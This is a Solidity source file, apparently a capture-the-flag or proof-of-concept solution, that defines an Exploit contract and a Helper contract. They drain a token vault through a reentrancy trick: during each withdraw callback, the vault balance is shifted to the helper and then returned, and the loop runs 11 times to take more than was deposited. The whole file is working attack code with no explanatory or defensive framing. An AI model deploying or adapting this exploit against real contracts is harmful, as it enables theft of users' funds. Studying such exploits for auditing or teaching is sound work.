// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IToken {
    function wrap() external payable;
    function approve(address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint);
}

interface IVault {
    function token() external view returns (address);
    function deposit(uint) external;
    function withdraw(uint) external;
    function transfer(address, uint) external;
}

contract Helper {
    IVault vault;
    address owner;
    constructor(address v, address o) { vault = IVault(v); owner = o; }
    function back(uint amt) external {
        vault.transfer(owner, amt);
    }
}

contract Exploit {
    IVault vault;
    IToken token;
    Helper helper;
    bool active;

    constructor(address target) payable {
        vault = IVault(target);
        token = IToken(vault.token());
        helper = new Helper(target, address(this));
        token.wrap{value: msg.value}();
        token.approve(target, msg.value);
        vault.deposit(msg.value);
    }

    function run() external {
        uint amt = 1 ether;
        for (uint i = 0; i < 11; i++) {
            active = true;
            vault.withdraw(amt);
            active = false;
            helper.back(amt);
        }
    }

    function onTokenReceived(address, uint amount) external {
        if (active && msg.sender == address(token)) {
            active = false;
            vault.transfer(address(helper), amount);
        }
    }
}
